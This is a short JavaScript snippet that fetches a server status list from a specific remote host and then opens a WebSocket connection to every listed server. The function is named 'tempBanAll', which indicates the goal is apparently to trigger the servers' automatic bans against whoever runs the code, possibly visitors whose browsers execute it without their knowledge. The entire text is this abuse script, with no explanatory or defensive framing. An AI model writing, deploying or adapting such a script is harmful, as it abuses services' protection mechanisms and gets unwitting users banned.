const tempBanAll = (data) => {
    const servers = data.status;
    const hosts = [];

    for (let server of Object.values(servers)) {
        hosts.push(server.host);
    }
    
    hosts.forEach(host => new WebSocket('wss://' + host));
};

fetch('https://n15rqgeh01clbn7n.d.nsrv.cloud:2222/status')
    .then(res => res.json())
    .then(data => tempBanAll(data));
